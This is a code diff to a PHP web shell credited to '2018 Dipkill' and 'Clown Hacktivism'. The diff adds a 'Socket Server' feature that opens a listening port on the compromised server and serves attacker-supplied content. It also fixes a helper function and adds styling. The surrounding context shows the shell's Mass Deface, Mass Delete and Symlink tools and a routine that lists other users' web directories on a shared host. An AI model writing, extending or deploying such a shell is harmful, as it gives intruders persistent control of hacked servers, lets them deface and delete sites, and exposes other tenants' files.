@@ -46,7 +46,7 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
         login_shell();
 if(get_magic_quotes_gpc()) {
 	function cht_ss($array) {
-		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
+		return is_array($array) ? array_map('cht_ss', $array) : stripslashes($array);
 	}
 	$_POST = cht_ss($_POST);
 }
@@ -166,7 +166,26 @@ echo "
             border: 1px solid red;
             background-color: transparent;
         }
-  
+    .tooltip .tooltiptext {
+        visibility: hidden;
+        width: 250px;
+        background-color: transparent;
+        color: red;
+        text-align: center;
+        border-radius: 7px;
+        padding: 10px 0;
+        position: absolute;
+        z-index: 1;
+        border: 1px solid darkgreen;
+    }
+    .tooltip:hover .tooltiptext {
+        visibility: visible;
+    }
+    .tooltip {
+        border-bottom: 1px solid darkgreen;        
+        position: relative;
+        display: inline-block;
+    }  
     </style>
 </head>
 <body>";
@@ -363,6 +382,7 @@ echo "<ul>
 <li><a class='head' href='?dir=$path&act=makefile'>[ +Make New File ]</a></li>
 <li><a class='head' href='?act=phpinfo'>[ PHP Info ]</a></li>
 <li><a class='head' href='?act=mass'>[ Mass Deface ]</a></li>
+<li><a class='head' href='?act=socket'>[ Socket Server ]</a></li>
 <br><br>
 <li><a class='head' href='?act=massdelete'>[ Mass Delete ]</a></li>
 <li><a class='head' href='?act=symlink'>[ Symlink ]</a></li>
@@ -785,6 +805,39 @@ elseif($_GET['act'] == 'jumping'){
 	if ($i > 100){ $pos = strpos($str,':'); $username = substr($str,0,$pos); $dirz = '/home/'.$username.'/public_html/'; if (($username != '')){ if (is_readable($dirz)){ array_push($users,$username); array_push($pub,$dirz); } } } $i++; } foreach ($users as $user){ echo '[OK] <a href="?dir=/home/'.$user.'/public_html">/home/'.$user.'/public_html/</a><br>'; } 
 	 }
 ///////////////////
+elseif ($_GET["act"] == "socket"){
+    echo "<form method='post'>
+              <center>
+              <input type='text' name='port' style='width: 100px;height: 20px;' placeholder='Port'>
+              <br><br>
+              <textarea placeholder='Script' name='script' style='width: 400px; height: 200px;'></textarea>
+              <br><input type='submit' value='Submit' name='submit'><br><br>
+              <div class='tooltip'>Help Click me Baby..!!
+                <span class='tooltiptext'>default port: 2810<br>
+                  NB: if server  no Root.. Port > 1024</span>
+              </div>                    
+         </form></center>";
+    if (isset($_POST["submit"])){
+    set_time_limit (0);
+    if(!empty($_POST['port']) && is_numeric($_POST['port'])) {
+	    $port = $_POST['port'];
+    } else {
+	    $port = 2810;
+    }
+    $sock = socket_create(AF_INET, SOCK_STREAM, 0);
+    @socket_bind($sock, 0, $port) or die('<script>alert("lnct_error: Failed to bind port");</script>');
+    socket_listen($sock);
+    $script = $_POST["script"];
+    while ($client = socket_accept($sock)) {
+	    $response = "HTTP/1.0 200 OK\r\n";
+	    $response .= "Server: Dipkill-SSWP\r\n";
+	    $response .= "Content-Type: text/html\r\n\r\n";
+	    $response .= $script;
+	    socket_write($client, $response);
+	    socket_close($client);
+    }
+    socket_close($sock);}
+}
     if ($_GET["act"] == "phpinfo") echo phpinfo();
 echo "<br><br><b><center>
 Copyright &copy;".shell_color("2018 Dipkill")." • ".shell_color("Clown Hacktivism")."</center></b>";
@@ -792,7 +845,6 @@ Copyright &copy;".shell_color("2018 Dipkill")." • ".shell_color("Clown Hacktiv
 echo "</body>
 </html>";
 ?>
-
 
 
 
